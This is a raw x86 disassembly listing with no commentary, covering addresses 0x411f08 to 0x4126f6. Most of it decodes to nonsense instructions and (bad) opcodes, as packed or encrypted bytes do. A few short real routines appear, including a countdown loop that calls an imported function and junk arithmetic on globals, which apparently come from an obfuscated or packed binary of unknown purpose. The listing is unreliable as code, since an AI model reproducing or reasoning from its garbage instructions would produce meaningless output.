  411f08:	lock aas 
  411f0a:	jb     0x411efc
  411f0c:	in     al,dx
  411f0d:	aad    0x20
  411f0f:	faddp  st(5),st
  411f11:	mov    bl,0x0
  411f13:	mov    esp,DWORD PTR [edi-0xeec143f]
  411f19:	push   es
  411f1a:	loop   0x411f4f
  411f1c:	inc    edx
  411f1d:	aad    0x12
  411f1f:	push   es
  411f20:	adc    eax,0x9370360
  411f25:	lea    edx,[edx+0x1460ee1a]
  411f2b:	popf   
  411f2c:	jmp    0x1793d4f7
  411f31:	call   0x3fb0:0xcba999e4
  411f38:	sbb    DWORD PTR [edi+eiz*4],0xffffffd1
  411f3c:	out    dx,al
  411f3d:	outs   dx,DWORD PTR ds:[esi]
  411f3e:	or     al,BYTE PTR [esi+ebp*1+0x22]
  411f42:	into   
  411f43:	movzx  ebp,BYTE PTR [eax]
  411f46:	mul    dl
  411f48:	stc    
  411f49:	or     eax,0xf62821f7
  411f4e:	stos   DWORD PTR es:[edi],eax
  411f4f:	push   edx
  411f50:	or     eax,0xff4c10d0
  411f55:	inc    ebx
  411f56:	push   edi
  411f57:	xchg   edx,eax
  411f58:	push   eax
  411f59:	cwde   
  411f5a:	xor    bl,cl
  411f5c:	fistp  QWORD PTR [ebx-0x4e2692b3]
  411f62:	jge    0x411f9e
  411f64:	imul   esi,DWORD PTR [edi+ebp*2],0x1d7d94b6
  411f6b:	mov    DWORD PTR [eax+0x3e87799c],ebx
  411f71:	xlat   BYTE PTR ds:[ebx]
  411f72:	stos   BYTE PTR es:[edi],al
  411f73:	jmp    FWORD PTR [ebx+ebx*1+0x3c]
  411f77:	push   ebx
  411f78:	(bad)  
  411f79:	pop    edx
  411f7a:	jb     0x411f10
  411f7c:	and    al,0x22
  411f7e:	cmp    esp,DWORD PTR [edi+0x4dd6cb59]
  411f84:	sub    eax,0xab4816f6
  411f89:	adc    DWORD PTR [ebp+0x30208094],ebp
  411f8f:	pop    DWORD PTR [edi+0x28]
  411f92:	and    dl,dh
  411f94:	push   0xffffffe5
  411f96:	push   ebp
  411f97:	inc    eax
  411f98:	stos   BYTE PTR es:[edi],al
  411f99:	les    esp,FWORD PTR [esi+0x222880d6]
  411f9f:	sbb    DWORD PTR [esi],esi
  411fa1:	repnz sbb DWORD PTR [edi-0x1ebaac10],ebx
  411fa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fa9:	xchg   edi,eax
  411faa:	loope  0x411f49
  411fac:	mov    ds:0xe159f316,eax
  411fb1:	jp     0x411fed
  411fb3:	icebp  
  411fb4:	popa   
  411fb5:	std    
  411fb6:	repnz add BYTE PTR [ebx],bl
  411fb9:	rep outs dx,DWORD PTR ds:[esi]
  411fbb:	mul    DWORD PTR [edi]
  411fbd:	shl    BYTE PTR [esi-0xb],1
  411fc0:	push   ebx
  411fc1:	sub    esi,DWORD PTR [edi]
  411fc3:	or     DWORD PTR [eax-0x3c],esp
  411fc6:	sbb    ebp,DWORD PTR [eax+ebp*1]
  411fc9:	mov    edi,0x847dfae3
  411fce:	sbb    BYTE PTR [edi-0x1a],ch
  411fd1:	mov    al,ds:0x89e9d025
  411fd6:	call   0x3d05:0x8ecc39d3
  411fdd:	inc    ebx
  411fde:	pop    esi
  411fdf:	sub    dl,ch
  411fe1:	daa    
  411fe2:	mov    eax,0xea1dcc48
  411fe7:	ja     0x412026
  411fe9:	push   esp
  411fea:	mov    ah,0xc1
  411fec:	rcr    dl,1
  411fee:	mov    esi,DWORD PTR [ecx+0x66]
  411ff1:	inc    eax
  411ff2:	in     eax,0xe9
  411ff4:	xchg   ebx,eax
  411ff5:	std    
  411ff6:	inc    edi
  411ff7:	psrlw  mm7,mm3
  411ffa:	push   es
  411ffb:	xchg   edx,eax
  411ffc:	pop    ds
  411ffd:	push   edi
  411ffe:	icebp  
  411fff:	sti    
  412000:	test   DWORD PTR [edi+edi*8+0x5f7619e6],0x7b93b615
  41200b:	adc    al,0x7e
  41200d:	pop    es
  41200e:	pop    ebp
  41200f:	cwde   
  412010:	fiadd  DWORD PTR ds:0xe0b76386
  412016:	dec    esp
  412017:	fidiv  DWORD PTR [edi+0x59e7605f]
  41201d:	mov    al,BYTE PTR [edx+ebp*2+0x501c6171]
  412024:	pop    esp
  412025:	imul   eax,DWORD PTR ds:0x46a94396,0xffffffaf
  41202c:	pushf  
  41202d:	sbb    eax,0x848e8536
  412032:	sub    ebx,DWORD PTR [edx-0x50]
  412035:	xor    eax,0x581dd9ec
  41203a:	add    bh,cl
  41203c:	sbb    DWORD PTR [esi+0x76],ebx
  41203f:	data16 loope 0x412097
  412042:	adc    BYTE PTR [edi-0x2e],al
  412045:	and    al,0xfd
  412048:	pop    ebx
  412049:	in     eax,0xe8
  41204b:	dec    edx
  41204c:	fwait
  41204d:	pop    ebp
  41204e:	scas   al,BYTE PTR es:[edi]
  41204f:	test   BYTE PTR [edi],al
  412051:	lods   eax,DWORD PTR ds:[esi]
  412052:	dec    esi
  412053:	mov    ds:0x4de63ee6,eax
  412058:	and    al,0xd1
  41205a:	inc    BYTE PTR [edx]
  41205c:	adc    edi,DWORD PTR [edx+0x1c]
  41205f:	dec    ebp
  412060:	mov    edi,0x25f3c6ca
  412065:	mov    eax,0xd1726b57
  41206a:	int3   
  41206b:	and    eax,0x6c871ecc
  412070:	and    eax,edi
  412072:	out    0xc3,eax
  412074:	bound  ecx,QWORD PTR [ecx]
  412076:	into   
  412077:	out    0x78,eax
  412079:	(bad)  
  41207a:	(bad)  
  41207b:	scas   al,BYTE PTR es:[edi]
  41207c:	mov    esp,0xa19438c2
  412081:	aam    0x4d
  412083:	sbb    DWORD PTR [ebp-0x74],eax
  412086:	xchg   ebp,eax
  412087:	ins    BYTE PTR es:[edi],dx
  412088:	adc    edi,DWORD PTR ds:0x3d48d164
  41208e:	xchg   edi,eax
  41208f:	xchg   esi,eax
  412090:	dec    esi
  412091:	retf   
  412092:	pop    edx
  412093:	scas   eax,DWORD PTR es:[edi]
  412094:	hlt    
  412095:	lods   eax,DWORD PTR ds:[esi]
  412096:	ror    BYTE PTR [ebx+0x202f6a9c],1
  41209c:	dec    eax
  41209d:	mov    dl,0x2
  41209f:	or     al,0xee
  4120a1:	loopne 0x41208e
  4120a3:	aaa    
  4120a4:	adc    BYTE PTR [edi-0x41],0x96
  4120a8:	stos   BYTE PTR es:[edi],al
  4120a9:	mov    eax,DWORD PTR [ebp+0x8]
  4120ac:	mov    eax,DWORD PTR [eax]
  4120ae:	mov    ecx,DWORD PTR ds:0x41b224
  4120b4:	add    DWORD PTR [eax],ecx
  4120b6:	pop    esi
  4120b7:	pop    ebp
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fd76
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fcd5
  4120d3:	adc    DWORD PTR ds:0x42e6ef,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e6eb,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e703,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e6fb,0x19
  412102:	cmp    DWORD PTR ds:0x42e6fb,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e6fb,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fd7e
  412121:	push   0x0
  412123:	push   0x42e26d
  412128:	call   DWORD PTR ds:0x42e483
  41212e:	mov    ebx,DWORD PTR ds:0x42e6fb
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e6fb,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e120,0x42fd01
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	pushf  
  41216e:	fstp   QWORD PTR [ecx+0x705f46ce]
  412174:	jo     0x41212f
  412176:	jle    0x4121e8
  412178:	jo     0x4121cc
  41217a:	das    
  41217b:	std    
  41217c:	and    BYTE PTR [eax],dh
  41217e:	cmp    edi,DWORD PTR [ebx+0x5f27fe33]
  412184:	jne    0x41210f
  412186:	inc    edi
  412187:	popa   
  412188:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412189:	xor    dh,BYTE PTR [ebx-0x63]
  41218c:	xor    eax,0xa91ffc22
  412191:	ror    BYTE PTR [ebx-0x4d3fe52e],1
  412197:	mov    ah,0x7d
  412199:	pop    edi
  41219a:	lock hlt 
  41219c:	jl     0x41211f
  41219e:	idiv   dh
  4121a0:	add    bl,dh
  4121a2:	outs   dx,BYTE PTR ds:[esi]
  4121a3:	mov    ah,0x43
  4121a5:	stos   DWORD PTR es:[edi],eax
  4121a6:	sbb    BYTE PTR [esi+ebx*1+0x66f9efb3],ch
  4121ad:	into   
  4121ae:	stc    
  4121af:	or     ebx,ebp
  4121b1:	xor    al,0x51
  4121b3:	call   0x1adb2ae5
  4121b8:	(bad)  
  4121b9:	xchg   edx,eax
  4121ba:	aad    0xd
  4121bc:	lahf   
  4121bd:	call   0xe92c569a
  4121c2:	xor    al,0xed
  4121c4:	mov    esp,0x7898eea3
  4121c9:	ror    DWORD PTR [edi-0x19bca81a],0xc1
  4121d0:	inc    edx
  4121d1:	xchg   ebp,eax
  4121d2:	rcl    BYTE PTR [ecx],1
  4121d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121d5:	sahf   
  4121d6:	cpuid  
  4121d8:	and    edx,DWORD PTR [ecx+0x35171478]
  4121de:	out    dx,al
  4121df:	into   
  4121e0:	and    bh,BYTE PTR [ebx+0xb6c4472]
  4121e6:	mov    WORD PTR [ebp-0x10],ss
  4121e9:	push   eax
  4121ea:	aam    0x81
  4121ec:	pop    ebx
  4121ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121ee:	pop    edi
  4121ef:	add    al,BYTE PTR [ebp-0x55847ad]
  4121f5:	mov    ecx,0x8fd61d9f
  4121fa:	and    edx,DWORD PTR [eax]
  4121fc:	fwait
  4121fd:	adc    bh,BYTE PTR [eax+0x58]
  412200:	sub    eax,0x3150bf25
  412205:	mov    bl,0xbd
  412207:	aas    
  412208:	cmp    al,0xee
  41220a:	loopne 0x4121b3
  41220c:	or     al,BYTE PTR [ebp-0x4a]
  41220f:	jb     0x41223e
  412211:	cld    
  412212:	push   edi
  412213:	imul   edi,DWORD PTR [esi+ecx*8-0x68],0x58dc8010
  41221b:	xor    ch,BYTE PTR [esi+0x3dc5ba9d]
  412221:	sbb    DWORD PTR [ebx+0x36b996ef],ebx
  412227:	lock ficom WORD PTR [eax-0x5b]
  41222b:	retf   0x7f6d
  41222e:	mov    eax,ds:0xedf8bdce
  412233:	scas   eax,DWORD PTR es:[edi]
  412234:	les    edi,FWORD PTR [ebx+ecx*4+0x3]
  412238:	jmp    0x412290
  41223a:	shl    BYTE PTR [eax],0x8c
  41223d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41223e:	popf   
  41223f:	xor    esi,DWORD PTR [ebx-0x37]
  412242:	add    BYTE PTR [edx+0x3],dl
  412245:	xor    al,0x9d
  412247:	(bad)  
  412248:	or     edx,edi
  41224a:	in     al,dx
  41224b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41224c:	cmp    ebp,edx
  41224e:	aas    
  41224f:	inc    ebx
  412250:	rol    DWORD PTR [eax-0x3],cl
  412253:	out    0xe6,al
  412255:	icebp  
  412256:	add    eax,0x306d9945
  41225b:	adc    eax,0x10433372
  412260:	push   cs
  412261:	mov    cs,WORD PTR [ebx-0x37b04486]
  412267:	xor    BYTE PTR [edx-0x2326fd3e],ch
  41226d:	mov    ?,WORD PTR [ecx]
  41226f:	jns    0x4122e2
  412271:	pushf  
  412272:	test   BYTE PTR [esi-0x46],0xfa
  412276:	test   ecx,ebx
  412278:	lahf   
  412279:	mov    dh,0xa5
  41227b:	inc    ebp
  41227c:	ret    
  41227d:	and    al,0xa0
  41227f:	fisub  WORD PTR [eax+eiz*4]
  412282:	test   DWORD PTR [ecx-0x5f],eax
  412285:	ror    BYTE PTR ds:0x5aefec8a,cl
  41228b:	add    BYTE PTR [di],ch
  41228e:	xchg   cl,cl
  412290:	pop    ebx
  412291:	fdiv   st,st(5)
  412293:	jne    0x412264
  412295:	arpl   WORD PTR [edx],si
  412297:	jge    0x4122fa
  412299:	xor    al,0x2a
  41229b:	mov    ds:0x5d7f8a5d,al
  4122a0:	sub    BYTE PTR [esp+ecx*8],bh
  4122a3:	mov    ebp,0x3e0a03b5
  4122a8:	and    al,0xb3
  4122aa:	inc    esi
  4122ab:	mov    ch,BYTE PTR [edi+0x77]
  4122ae:	jns    0x4122ea
  4122b0:	push   eax
  4122b1:	test   al,0xf7
  4122b3:	sbb    ch,bl
  4122b5:	in     eax,dx
  4122b6:	lods   eax,DWORD PTR ds:[esi]
  4122b7:	out    dx,al
  4122b8:	fwait
  4122b9:	pop    edi
  4122ba:	js     0x412244
  4122bc:	cmp    BYTE PTR [ecx+0x66],0x35
  4122c0:	pop    eax
  4122c1:	add    BYTE PTR [edx-0x34],0x32
  4122c5:	cmp    DWORD PTR [edi-0x5],edx
  4122c8:	scas   al,BYTE PTR es:[edi]
  4122c9:	xchg   BYTE PTR [edi+0x372761aa],cl
  4122cf:	xor    esi,DWORD PTR [esi+0x69]
  4122d2:	call   0x3f91fc01
  4122d7:	enter  0x6312,0x83
  4122db:	fldl2e 
  4122dd:	mov    dl,0x37
  4122df:	in     al,0xf7
  4122e1:	dec    esp
  4122e2:	bound  edi,QWORD PTR cs:0xecea6aba
  4122e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122ea:	pop    ebx
  4122eb:	cld    
  4122ec:	iret   
  4122ed:	aaa    
  4122ee:	repz in eax,0xd9
  4122f1:	xchg   esp,eax
  4122f2:	lock push 0x6f76c01d
  4122f8:	repnz test al,0x4
  4122fb:	inc    edi
  4122fc:	rol    bh,cl
  4122fe:	daa    
  4122ff:	mov    edx,0xf886c500
  412304:	xor    eax,ecx
  412306:	inc    ecx
  412307:	dec    ebp
  412308:	cmp    eax,0x78903279
  41230d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41230e:	(bad)  
  41230f:	xchg   eax,ebx
  412311:	js     0x412315
  412313:	jns    0x412330
  412315:	push   ecx
  412316:	fistp  WORD PTR [eax+0x47]
  412319:	outs   dx,DWORD PTR ds:[esi]
  41231a:	rol    ch,cl
  41231c:	int    0x98
  41231e:	ja     0x41236e
  412320:	popf   
  412321:	add    eax,DWORD PTR [ebp+0x1c46212a]
  412327:	push   es
  412328:	xor    eax,0x2aae29d4
  41232d:	jno    0x4122b7
  41232f:	icebp  
  412330:	cmp    BYTE PTR ds:0xb2ba4d12,al
  412336:	call   0xe0bc:0x9e4a3c01
  41233d:	aas    
  41233e:	ffree  st(5)
  412340:	adc    al,0xa9
  412342:	inc    ebp
  412343:	mov    DWORD PTR [eax-0x14],0x30253ad3
  41234a:	nop
  41234b:	(bad)
  41234e:	xchg   edi,eax
  41234f:	pop    edi
  412350:	outs   dx,BYTE PTR ds:[esi]
  412351:	stos   BYTE PTR es:[edi],al
  412352:	xchg   ebx,eax
  412353:	dec    edi
  412354:	jne    0x412367
  412356:	sar    ch,1
  412358:	or     al,0x28
  41235a:	loope  0x4122fa
  41235c:	sbb    eax,0x2fbea890
  412361:	add    al,0x28
  412363:	jecxz  0x41239c
  412365:	cmc    
  412366:	adc    DWORD PTR [ebp-0x1e7088d1],ebp
  41236c:	jns    0x412335
  41236e:	mov    al,ds:0xac961c7
  412373:	ror    bh,0x32
  412376:	mov    ebx,0x4483ad85
  41237b:	mov    edx,0xa9f54408
  412380:	shl    BYTE PTR [ecx+0x55],cl
  412383:	sbb    edi,DWORD PTR ds:0xbfda1186
  412389:	ret    0x3846
  41238c:	sbb    dh,BYTE PTR [eax-0x4f]
  41238f:	inc    eax
  412390:	in     al,dx
  412391:	fsub   QWORD PTR [edx]
  412393:	cld    
  412394:	mov    al,ds:0xc4758f01
  412399:	dec    edi
  41239a:	ja     0x412419
  41239c:	fadd   st(5),st
  41239e:	push   edx
  41239f:	mov    DWORD PTR [ecx],0x4cb78343
  4123a5:	xchg   ecx,eax
  4123a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123a7:	push   0x3d
  4123a9:	dec    BYTE PTR [ebx]
  4123ab:	sub    ch,BYTE PTR [edx+ebp*1-0x77]
  4123af:	aad    0x42
  4123b1:	pop    esp
  4123b2:	jne    0x41242a
  4123b4:	mov    ebp,0xcddb1af4
  4123b9:	lahf   
  4123ba:	aad    0x61
  4123bc:	pop    eax
  4123bd:	and    al,0xf2
  4123bf:	xlat   BYTE PTR ds:[ebx]
  4123c0:	push   edx
  4123c1:	mov    ecx,0xa18368a4
  4123c6:	cwde   
  4123c7:	jge    0x4123ba
  4123c9:	dec    ecx
  4123ca:	loope  0x412444
  4123cc:	sbb    ah,ah
  4123ce:	adc    eax,0xbf17be7d
  4123d3:	dec    esp
  4123d4:	push   ds
  4123d5:	push   0x1b
  4123d7:	daa    
  4123d8:	outs   dx,BYTE PTR ds:[esi]
  4123d9:	fdiv   st(4),st
  4123db:	mov    ecx,ss
  4123dd:	xchg   esi,eax
  4123de:	jp     0x4123f2
  4123e0:	lahf   
  4123e1:	cmp    BYTE PTR [esi+0x19],bh
  4123e4:	adc    al,0x0
  4123e6:	pop    edx
  4123e7:	push   es
  4123e8:	xchg   esp,eax
  4123e9:	daa    
  4123ea:	in     al,0x5
  4123ec:	xor    BYTE PTR ds:0xbf10df23,bh
  4123f2:	(bad)  
  4123f3:	pop    edx
  4123f4:	xlat   BYTE PTR ds:[ebx]
  4123f5:	jecxz  0x4123dc
  4123f7:	arpl   WORD PTR [edx],si
  4123f9:	outs   dx,DWORD PTR ds:[esi]
  4123fa:	jne    0x4123db
  4123fc:	mov    edx,0xa58495db
  412401:	(bad)  
  412402:	cs mov esi,0xa6994002
  412408:	sub    al,0x10
  41240a:	(bad)  
  41240c:	push   ebp
  41240d:	stos   BYTE PTR es:[edi],al
  41240e:	mov    ecx,0x268576b3
  412413:	stos   DWORD PTR es:[edi],eax
  412414:	sub    eax,0x372edd05
  412419:	hlt    
  41241a:	xlat   BYTE PTR ds:[ebx]
  41241b:	aaa    
  41241c:	arpl   WORD PTR [ebp+0x2073bee2],bx
  412422:	icebp  
  412423:	cmp    ebx,DWORD PTR [ecx-0x9e6511a]
  412429:	das    
  41242a:	sub    BYTE PTR [edx-0x7268342f],bh
  412430:	dec    ecx
  412431:	sahf   
  412432:	adc    al,0xba
  412434:	mov    dl,0x29
  412436:	aad    0xab
  412438:	or     DWORD PTR [edx+0x20],edx
  41243b:	ins    DWORD PTR es:[edi],dx
  41243c:	call   0x3f21f9f
  412441:	retf   
  412442:	sub    DWORD PTR ds:0x42fcf9,0xf96
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	adc    al,BYTE PTR [esi+eax*4+0x705c8f68]
  412464:	jo     0x41241f
  412466:	jle    0x4124d8
  412468:	jo     0x41242f
  41246a:	and    al,0x7c
  41246c:	push   0x2d
  41246e:	in     al,0x1d
  412470:	or     eax,0x96a43445
  412475:	out    dx,al
  412476:	loope  0x412469
  412478:	das    
  412479:	ret    0x6789
  41247c:	or     DWORD PTR [edx+0x55f06890],ecx
  412482:	mov    DWORD PTR ds:0x90833966,edx
  412488:	jmp    0x447f19cd
  41248d:	dec    eax
  41248e:	xchg   esi,eax
  41248f:	xor    DWORD PTR [ebp-0x51],edx
  412492:	out    0xb4,al
  412494:	jmp    0x4124cb
  412496:	fsub   st(2),st
  412498:	push   ss
  412499:	lea    cx,[ecx]
  41249c:	jp     0x4124c4
  41249e:	push   ds
  41249f:	pop    ecx
  4124a0:	sbb    BYTE PTR [esi],ah
  4124a2:	addr16 jb 0x4124b2
  4124a5:	or     ah,dl
  4124a7:	shl    BYTE PTR [esi-0xa],cl
  4124aa:	mov    ebp,0x158e0df7
  4124af:	add    eax,0xeb969578
  4124b4:	test   esp,ecx
  4124b6:	jno    0x4124e1
  4124b8:	rcl    BYTE PTR [eax-0x26436b6f],cl
  4124be:	in     eax,dx
  4124bf:	pop    edi
  4124c0:	retf   
  4124c1:	lods   al,BYTE PTR ds:[esi]
  4124c2:	shl    bl,cl
  4124c4:	push   ecx
  4124c5:	or     al,0x98
  4124c7:	mov    BYTE PTR [edx+ecx*1+0x65],ch
  4124cb:	aaa    
  4124cc:	(bad)  [esi]
  4124ce:	or     al,0x15
  4124d0:	push   es
  4124d1:	and    DWORD PTR [edi],eax
  4124d3:	jne    0x412554
  4124d5:	fstp   st(4)
  4124d7:	popa   
  4124d8:	std    
  4124d9:	out    0xc,al
  4124db:	ja     0x41253c
  4124dd:	out    dx,eax
  4124de:	push   esp
  4124df:	inc    esi
  4124e0:	pop    edx
  4124e1:	inc    esp
  4124e2:	gs mov bl,0x3
  4124e5:	inc    sp
  4124e7:	push   ebx
  4124e8:	aaa    
  4124e9:	adc    BYTE PTR [esi],bl
  4124eb:	dec    edi
  4124ec:	xor    DWORD PTR [esp+edi*4+0x22556d3a],ebx
  4124f3:	rol    dh,0x3e
  4124f6:	or     DWORD PTR [ecx+0x19],ebx
  4124f9:	xchg   esp,esi
  4124fb:	jne    0x4124da
  4124fd:	mov    ss,WORD PTR [esi+0x8280acd]
  412503:	fadd   QWORD PTR [ebp-0x5c]
  412506:	ror    DWORD PTR [esi-0x25],1
  412509:	in     eax,0x1a
  41250b:	pop    esp
  41250c:	retf   
  41250d:	test   al,0x81
  41250f:	jl     0x412546
  412511:	inc    ecx
  412512:	jne    0x412510
  412514:	pushf  
  412515:	sbb    esi,eax
  412517:	or     esp,ebp
  412519:	adc    dl,BYTE PTR [edi-0x356ed6d4]
  41251f:	and    eax,0x96bfd859
  412524:	aas    
  412525:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412526:	or     DWORD PTR [edi],0xffffffa6
  412529:	xchg   dh,dl
  41252b:	xor    BYTE PTR [edx-0x5e],dh
  41252e:	mov    ecx,0x4489a1f5
  412533:	xchg   ecx,eax
  412534:	sbb    DWORD PTR [esi-0x2a060519],esp
  41253a:	xchg   esp,eax
  41253b:	sub    BYTE PTR [ebp-0x6f],dl
  41253e:	mov    bh,0x6f
  412540:	and    al,0x8a
  412542:	test   ch,cl
  412544:	test   BYTE PTR [ecx-0x4f],ch
  412547:	add    eax,0xfadb2067
  41254c:	dec    eax
  41254d:	ja     0x412543
  41254f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412550:	cmp    eax,DWORD PTR [esi+eax*2]
  412553:	inc    esp
  412554:	jno    0x4124ee
  412556:	mov    ebx,0xaa541e05
  41255b:	js     0x4125c1
  41255d:	mov    ebx,0x2044c774
  412562:	xlat   BYTE PTR ds:[ebx]
  412563:	inc    ecx
  412564:	xor    eax,0x730554a1
  412569:	xchg   ebx,eax
  41256a:	ins    BYTE PTR es:[edi],dx
  41256b:	mov    dh,0xcd
  41256d:	inc    edi
  41256e:	push   ebx
  41256f:	stos   DWORD PTR es:[edi],eax
  412570:	mov    BYTE PTR [ebx+0x3e],cl
  412573:	add    DWORD PTR [esi],eax
  412575:	lods   eax,DWORD PTR ds:[esi]
  412576:	or     al,0xbb
  412578:	div    dl
  41257a:	test   al,0xfb
  41257c:	fdivr  QWORD PTR [ebx+0x2dd8876d]
  412582:	neg    BYTE PTR ds:0x2074c891
  412588:	xchg   DWORD PTR [ebp+0x2bd4487],ebx
  41258e:	js     0x4125ad
  412590:	bound  esi,QWORD PTR [ebx]
  412592:	or     esi,DWORD PTR [edi+edi*2+0x4f]
  412596:	pop    edx
  412597:	fimul  DWORD PTR [edx+0x41984937]
  41259d:	clc    
  41259e:	aas    
  41259f:	std    
  4125a0:	(bad)  
  4125a1:	inc    esp
  4125a2:	sbb    dh,bl
  4125a4:	int    0x18
  4125a6:	xchg   BYTE PTR [edi],dh
  4125a8:	adc    dh,al
  4125aa:	scas   eax,DWORD PTR es:[edi]
  4125ab:	ror    BYTE PTR [ecx],cl
  4125ad:	sub    BYTE PTR [ebx+0x438339ab],al
  4125b3:	out    0x5b,al
  4125b5:	mov    ch,0xd9
  4125b7:	ja     0x41255c
  4125b9:	xchg   esi,eax
  4125ba:	pushf  
  4125bb:	dec    ecx
  4125bc:	in     al,0xa9
  4125be:	mov    al,0xaa
  4125c0:	push   edi
  4125c1:	repnz fist WORD PTR [edi+0x63]
  4125c5:	mov    dl,0x4e
  4125c7:	les    ebp,FWORD PTR [eax]
  4125c9:	cmc    
  4125ca:	icebp  
  4125cb:	std    
  4125cc:	sub    esi,0xbb0e1d2e
  4125d2:	test   BYTE PTR [eax+0xd],ch
  4125d5:	sbb    al,BYTE PTR [esi+edi*1-0x58]
  4125d9:	xchg   ebx,eax
  4125da:	or     BYTE PTR [edx],dl
  4125dc:	arpl   WORD PTR ds:0xd2c68ec1,sp
  4125e2:	dec    esi
  4125e3:	std    
  4125e4:	inc    edi
  4125e5:	jns    0x412630
  4125e7:	xor    bl,BYTE PTR [ebx-0x52]
  4125ea:	add    al,0xbb
  4125ec:	lahf   
  4125ed:	call   0xfd69:0x8dadd4e4
  4125f4:	sbb    al,0x3d
  4125f6:	retf   
  4125f7:	inc    ecx
  4125f8:	call   0xc803a682
  4125fd:	xchg   DWORD PTR [esi+ecx*2-0x7b26b876],edx
  412604:	inc    ebp
  412605:	xchg   esp,eax
  412606:	push   esi
  412607:	test   eax,0xc7f9cc65
  41260c:	jns    0x4125a9
  41260e:	rdmsr  
  412610:	iret   
  412611:	mov    ds:0x311aa405,eax
  412616:	out    0x16,eax
  412618:	push   0xb50e3cf3
  41261d:	sub    cl,BYTE PTR [ebp-0x35514242]
  412623:	fcomp  QWORD PTR [ecx+0x5]
  412626:	(bad)  
  412627:	push   edi
  412628:	(bad)  
  412629:	jecxz  0x412659
  41262b:	push   edx
  41262c:	pusha  
  41262d:	je     0x412647
  41262f:	sti    
  412630:	fsub   QWORD PTR [esi-0x741595c2]
  412636:	push   es
  412637:	sbb    BYTE PTR [ecx-0x43cff5e9],al
  41263d:	xchg   edx,eax
  41263e:	add    DWORD PTR [esi+0x13320a3d],esi
  412644:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412645:	mov    dl,0x76
  412647:	ins    DWORD PTR es:[edi],dx
  412648:	sub    dl,BYTE PTR [edi-0x48db3133]
  41264e:	add    DWORD PTR [ecx+0x3c],ebx
  412651:	mov    WORD PTR [eax],fs
  412653:	lds    esi,FWORD PTR ds:0x4f87a32c
  412659:	pop    esi
  41265a:	stos   DWORD PTR es:[edi],eax
  41265b:	mov    ah,0xb6
  41265d:	iret   
  41265e:	shl    BYTE PTR [ebp+0xa06822a],1
  412664:	sbb    DWORD PTR [eax+edx*2],ecx
  412667:	push   ss
  412668:	mov    ebx,0xe1d00982
  41266d:	fist   WORD PTR [edx-0xad093c5]
  412673:	in     eax,0x46
  412675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412676:	pop    es
  412677:	fisub  DWORD PTR [edi]
  412679:	dec    esp
  41267a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41267b:	mov    dh,0x27
  41267d:	mov    ah,0x6e
  41267f:	jmp    0x5881fbe3
  412684:	add    ecx,esi
  412686:	jb     0x412646
  412688:	xor    al,0x0
  41268a:	ja     0x4126da
  41268c:	mov    ebp,0x7cc2cc2f
  412691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412692:	push   0xfffffff3
  412694:	cdq    
  412695:	push   0xa302d310
  41269a:	out    0xf6,al
  41269c:	add    al,0xa4
  41269e:	fidivr DWORD PTR [ebp-0x69]
  4126a1:	mov    esp,0x43e4b998
  4126a6:	jge    0x412691
  4126a8:	dec    eax
  4126a9:	loope  0x41262c
  4126ab:	dec    esi
  4126ac:	addr16 inc esi
  4126ae:	push   eax
  4126af:	rcr    BYTE PTR [edx],cl
  4126b1:	jae    0x4126e4
  4126b3:	mov    esp,0xefd528c1
  4126b8:	rcr    DWORD PTR [ecx+0x61c02af6],0xb9
  4126bf:	ret    
  4126c0:	stos   BYTE PTR es:[edi],al
  4126c1:	icebp  
  4126c2:	outs   dx,DWORD PTR ds:[esi]
  4126c3:	test   eax,0x69e46e09
  4126c8:	repz and DWORD PTR [ebx-0x3590973d],esi
  4126cf:	push   ebp
  4126d0:	lea    esp,[edx]
  4126d2:	pusha  
  4126d3:	and    al,0x77
  4126d5:	stos   BYTE PTR es:[edi],al
  4126d6:	in     al,dx
  4126d7:	xchg   edx,eax
  4126d8:	dec    dx
  4126da:	dec    ebx
  4126db:	dec    edi
  4126dc:	mov    eax,ds:0x95d0d7b4
  4126e1:	and    bl,BYTE PTR [ebx+0x47a0d182]
  4126e7:	sbb    BYTE PTR [eax-0x39],dl
  4126ea:	out    0xf4,al
  4126ec:	add    al,0x86
  4126ee:	(bad)  
  4126ef:	lock out dx,eax
  4126f1:	pop    es
  4126f2:	js     0x4126d8
  4126f4:	cmp    dh,dh
  4126f6:	test   bh,al
